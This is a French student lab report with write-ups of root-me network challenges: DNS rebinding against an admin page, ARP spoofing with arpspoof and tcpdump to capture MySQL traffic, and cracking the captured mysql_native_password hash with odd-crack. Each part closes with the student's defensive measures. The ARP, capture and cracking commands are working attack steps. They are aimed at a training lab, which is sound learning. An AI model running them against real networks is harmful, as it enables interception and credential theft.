# TP6 : Un peu de root-me

P'tit sujet de TP autour de **plusieurs épreuves [root-me](https://www.root-me.org)**.

**But du TP** : vous pétez les épreuves, je vous accompagne pour le faire, et en rendu je veux un ptit write-up.

> *Un write-up c'est la démarche technique pour arriver à l'objectif avec un peu de blabla pour expliquer ladite démarche.*

Chaque partie correspond à un chall root-me. Je compléterai un peu le sujet de TP au fur et à mesure que vous avancez.

## Sommaire

- [TP6 : Un peu de root-me](#tp6--un-peu-de-root-me)
  - [Sommaire](#sommaire)
  - [I. DNS Rebinding](#i-dns-rebinding)
  - [II. Netfilter erreurs courantes](#ii-netfilter-erreurs-courantes)
  - [III. ARP Spoofing Ecoute active](#iii-arp-spoofing-ecoute-active)
  - [IV. Bonus : Trafic Global System for Mobile communications](#iv-bonus--trafic-global-system-for-mobile-communications)

## I. DNS Rebinding

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/HTTP-DNS-Rebinding)


🌞 **Write-up de l'épreuve**

Je commance d'abord par me renseigner sur ce qu'est un dns rebiding

Je trouve sur ce [site](https://www.akamai.com/glossary/what-is-dns-rebinding) une présentation de ce que c'est avec un shemat grace au quel je comprends le type d'ataque que c'est 

C'est quoi un DNS rebinding ?

Tout d'abord, c'est une méthode qui permet de contourner la SOP, qui est un protocole. Pour faire simple, un site (donc un serveur) ne peut pas interagir avec un autre site, sauf s'ils ont le même nom de domaine.  

Pour comprendre l'attaque, il faut comprendre le principe de TTL.  
Quand on va sur un site, on demande à un serveur DNS l'IP du serveur que l'on veut contacter. Il va traduire pour nous google.com par une IP.  
On va donc pouvoir se connecter au nom de domaine Google grâce à cette IP. Cependant, notre réseau ne va pas retenir indéfiniment que cette IP correspond au nom de domaine de Google.  
Il va donc redemander au serveur DNS l'IP du nom de domaine.  
C'est donc ça, le TTL : c'est le temps pendant lequel notre réseau va retenir en cache l'IP du nom de domaine.  

Pour faire l'attaque, on va créer un site qui va permettre d'attaquer, par exemple www.site_qui_attaque.jsp.  
On va le lier à un serveur DNS que l'on contrôle.  
Un client va aller sur notre site, et notre serveur DNS va lui donner son IP, mais avec un très faible TTL. Le client connaît alors l'IP de mon site, mais le serveur DNS connaît aussi l'IP du résaux du client.  
Quand le client va recontacter le serveur DNS pour connaître l'IP du site, il va lui donner l'IP du résaux du client.  
Donc, au lieu de télécharger le code du site sur le serveur du site, il va le télécharger en local sur son résaux.  
Il suffit alors d'y mettre du code malveillant, et le client téléchargera ce code malveillant sur son résaux.  

Maintenant on lis le code que rootme nous donne  

On comprends donc que pour acceder a la page admin il faut avoir une sertaine ip (il faut étre en local sur le serveur)  
On comprends aussi que le site va faire plusieur vérification notament s'il l'ip est dans un lan et si l'ip est publique

On regarde ce que l'aplication web fait maintenant 

On lui donne un url et on nous renvoie dans une frame le site web qui correspond a l'url  

Le site est donc un potentiel client vers notre site malveillant pour le dns rebiding

On met donc en place le dns rebiding 

On demande au site de se connecter a notre site notre serveur dns réccupére l'ip du serveur du site
Le site télécharge le code du site en local notre site et l'éxécute
Notre site a pour but de renvoyer vers la page admin du site rootme
le site va donc ouvrire le site avec son ip local on passera les teste et on sera sur la page admin 

Pour réaliser le dns rebiding j'ai utiliser cette librérie github qui fonctionne trés bien (rbndr)[https://github.com/taviso/rbndr]

une fois le dns rebiding on y rentre notre url souhaité dans l'input : c0a80164.7f000001.rbndr.us:54022/admin
Qui est tout simplement mon ip traduit en exadécimale (c0a80164) . l'ip local du site traduit en exadécimale (7f00000).rbndr.us: le port (54022) /la page sur laquel je veux me rendre (admin)

Maintenant il faut faire plusieur requette de l'iput jusqu'au moment où l'ont va passer tout les tests et renrtrer dans la page damin 


🌞 **Proposer une version du code qui n'est pas vulnérable**

on peut déjà filtrer de maniére plus préssise les ip :  
en bloquand les adresse multicast qui sont des adresse ip non destiné au ussage web donc si une ip est multi cast cela montre une activité suspecte ip.is_multicast  
en ploquant les adrsse reserve qui sont des adresses qui ne sont pas accésible ce qui montrerais également une activité suspecte ip.is_reserved  
on peut également bloquer les adresse privé qui ne sont pas censé étre des adresse de site web  en y ajoutant ip.is_private   


on pourrais aussi ajouter une vérification qui s'assure que l'ip du site que l'on essaye de joindre n'est pas une ip locale on ne pourait donc plus accéder a admin en local avec la frame mais on y accéderait toujours via l'url classique du site 

on pourrait également ajouter un delay entre chauqe requette de l'app vers les urls demandé cela ralentirais la progréssion de l'ataquant 
## II. Netfilter erreurs courantes

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/Netfilter-erreurs-courantes)

- à chaque paquet reçu, un firewall parcourt les règles qui ont été configurées afin de savoir s'il accepte ou non le paquet
- une règle c'est genre "si un paquet vient de telle IP alors je drop"
- à chaque paquet reçu, il lit la liste des règles **de haut en bas** et dès qu'une règle match, il effectue l'action
- autrement dit, l'ordre des règles est important
- on cherche donc à match une règle qui est en ACCEPT

🌞 **Write-up de l'épreuve**


🌞 **Proposer un jeu de règles firewall**

- on doit là encore aboutir au même fonctionnalités : pas de régression
- mais la protection était voulue est vraiment mise en place (limitation du bruteforce)

## III. ARP Spoofing Ecoute active

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/ARP-Spoofing-Ecoute-active)

🌞 **Write-up de l'épreuve**

on fait un scan nmap pour connaitre les machines sur le resaux 

```bash
root@fac50de5d760:~# nmap -sn -PR  172.18.0.0/16
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-30 19:41 UTC
Nmap scan report for 172.18.0.1
Host is up (0.000020s latency).
MAC Address: 02:42:ED:C4:BA:CA (Unknown)
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.2)
Host is up (0.000027s latency).
MAC Address: 02:42:AC:12:00:02 (Unknown)
Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000043s latency).
MAC Address: 02:42:AC:12:00:04 (Unknown)
Nmap scan report for fac50de5d760 (172.18.0.3)
Host is up.
```
on peut voir qu'il y a 3 autres marchines : 0.1 l'hote 0.2 et 0.4

on scan alors les ports de 0.2 et 0.4: 

```bash
root@fac50de5d760:~# nmap -p- 172.18.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-30 19:42 UTC
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.2)
Host is up (0.000017s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds
root@fac50de5d760:~# nmap -p- 172.18.0.4
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-30 19:43 UTC
Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000016s latency).
All 65535 scanned ports on client.arp-spoofing-dist-2_default (172.18.0.4) are closed
MAC Address: 02:42:AC:12:00:04 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.38 seconds


```
on sait donc mtn que 0.2 est une db elle a le port 3306 de ouvert et le service mysql tourne dessus 
on sait également que 0.4 est un client que tout ses ports sont fermé




on va faire un man in the midle grace a un arpspoofing

```bash
root@fac50de5d760:~# arpspoof -t 172.18.0.2 172.18.0.4
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:3

```
et sur un autre shell 

```bash
root@fac50de5d760:~# arpspoof -t 172.18.0.4 172.18.0.2
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3
2:42:ac:12:0:3 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.2 is-at 2:42:ac:12:0:3

```

je suis donc maintenant en man in the midle je peux voir les communications entre les deux pc 

grace a dcpdump je lis ce trafique et je l'enregistre dans un fichier 

```bash
tcpdump -i eth0 not port 22 -w yoyo.pcap
```

aprés quelque minute j'arrétes d'enregistrer

je peux pas lire le fichier sur la vm je dois donc le transférer vers mon pc pour pouvoir l'ouvrir avec wireshark et lire le trafique 

Pour faire ça j'utilise filezilla 

[voci la capture dcpdump](./yoyo.pcap)


quand je lis la capture je peux voire les discutions entre la bdd et le client notament une phase de conexion ce qui nous intéresses pour essayer de trouver le mot de passe de cette bdd 

je peux y voir 2 trames utile:

une trame  greeting de la bdd qui acceuil le client donc bdd vers -> client 
je peux voir dans les datas de la capture deux salt et le nom du pluggin d'autentification mysql_native_password

l'autre trame est une demande de conexion du client vers la bdd 
je peux y voir notament le user qui est root ainsi que le mot de basse mais celuici est aché 

j'utilise une lib github pour décripter le challenge criptographique 
[la lib github](https://github.com/kazkansouh/odd-hash)

dans son readme il donne notament un exemple de commande pour craker un mot de passe de mysql_native_password

voici donc la commande que j'ai utilisé 

nico@debian:~$ odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:<span style="color:#26B260">72224a586734420949541b47643f26607a5f220d</span> rockyou.txt <span style="color:#5c9aff">7cd3412e12c8fd434bc70dcf5764eafcc853d5cc</span>

En <span style="color:#26B260"> vert </span> je renssaigne le salt ici la concaténation des deux salt trouvé dans la trame greeting  
En <span style="color:#5c9aff">bleu</span> je rensseigne le mot de passe aché que j'ai réccupéré dans la trame de conexion 

ce qu'il ya avant dans la commande corespond au challenge cryptographique c'est l'enssemble des opéation réalisé pour en arrivé au mot de passe aché 

la commande donne donc ce résultat :

```bash
nico@debian:~$ odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:72224a586734420949541b47643f26607a5f220d rockyou.txt 7cd3412e12c8fd434bc70dcf5764eafcc853d5cc
[*] loading file...
[*] found heyheyhey=7cd3412e12c8fd434bc70dcf5764eafcc853d5cc
[*] all hashes found, shutdown requested
[*] done, tried 4700 passwords

```
je sais donc que le mot de passe root pour se connecter à la db est heyheyhey

🌞 **Proposer une configuration pour empêcher votre attaque**

- empêcher la première partie avec le Poisoning/MITM

pur enpécher une arp Poisoning on peut métre en plac certaine mesures:  
filtrage de l'arp avec des Dynomic ARP Inspection (DAI) qui sont des dispotive amétre sur des switch pour filtrer les requétes arp suspecte 
On peut aussi définir des tables arp static seul probléme est gros inconvéniant si il y a de nouveau client pour la db il vas falloir définir les ip et mac dans les tables a la main  
il existe aussi des outils pour surveiller mais ils ne perméte pas vraiment de protéger c'est surtout des outils pour alerter en cas de suspiscions d'arp spoofing 

- empêcher la seconde partie (empêcher de retrouver le password de base de données)

on peut peut utilser des protocoles comme TLS/SSL ce sont des protocoles de conexion qui notament cripte les échanges donc lors d'un MITM c'est bcp plus complexe pour lire comprendre et exploité les donné réccuéprer pour l'attaquant 

Si malgré tout l'attaquant arrive a faire un arp spoofing et donc a se placer en MITM il existe des méthode tel que la l'encription du trafique cela sera beaucoup plus difficile et compléxe pour l'ataquant de lire et comprendre la disction entre les deux machines  
on doit aussi utiliser un autre pluggin d'autentification plus sécurisé tel que caching_sha2_password un pluggin mysql d'autentifiaction 

## IV. Bonus : Trafic Global System for Mobile communications

> [**Lien vers l'épreuve root-me.**](https://www.root-me.org/fr/Challenges/Reseau/Trafic-Global-System-for-Mobile-communications)

⭐ **BONUS : Write-up de l'épreuve**